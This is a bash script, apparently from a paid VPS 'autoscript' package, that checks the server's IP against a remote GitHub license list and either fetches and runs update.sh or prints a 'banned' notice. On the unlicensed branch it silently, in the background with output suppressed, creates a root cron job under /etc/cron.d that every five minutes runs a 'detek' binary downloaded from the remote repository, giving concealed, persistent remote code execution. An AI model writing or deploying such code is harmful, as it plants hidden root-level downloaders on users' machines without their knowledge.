#!/bin/bash
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
NC="\e[0m"
RED="\033[0;31m"
WH='\033[1;37m'
ipsaya=$(curl -sS ipv4.icanhazip.com)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/PeyxDev/esce/main/ipx"
checking_sc() {
    useexp=$(curl -sS "$data_ip" | grep "$ipsaya" | awk '{print $3}')
    date_list=$(date +%Y-%m-%d)

    if [[ $(date -d "$date_list" +%s) -lt $(date -d "$useexp" +%s) ]]; then
        echo -e " [INFO] Fetching server version..."
        REPO="https://raw.githubusercontent.com/PeyxDev/esce/main/" # Ganti dengan URL repository Anda
        serverV=$(curl -sS ${REPO}versi)

        if [[ -f /opt/.ver ]]; then
            localV=$(cat /opt/.ver)
        else
            localV="0"
        fi

        if [[ $serverV == $localV ]]; then
            echo -e " [INFO] Script sudah versi terbaru ($serverV). Tidak ada update yang diperlukan."
            return
        else
            echo -e " [INFO] Versi script berbeda. Memulai proses update script..."
            wget -q https://raw.githubusercontent.com/PeyxDev/esce/main/menu/update.sh -O update.sh
            chmod +x update.sh
            ./update.sh
            echo $serverV > /opt/.ver.local
            return
        fi
    else
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e ""
        echo -e "            \033[91;1mPERMISSION DENIED !\033[0m"
        echo -e "   \033[0;33mYour VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
        echo -e "     \033[0;33mBuy access permissions for scripts\033[0m"
        echo -e "             \033[0;33mContact Admin :\033[0m"
        echo -e "      \033[2;32mWhatsApp\033[0m wa.me/62831516636921"
        echo -e "      \033[2;32mTelegram\033[0m t.me/frel01"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
cd
        {
> /etc/cron.d/cpu_otm

cat> /etc/cron.d/cpu_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/bin/detek
END

wget https://raw.githubusercontent.com/PeyxDev/esce/main/install/detek
mv detek /usr/bin/detek
chmod +x /usr/bin/detek
detek
   } &> /dev/null &
echo "Loading Extract and Setup detek" | lolcat
    fi
}

checking_sc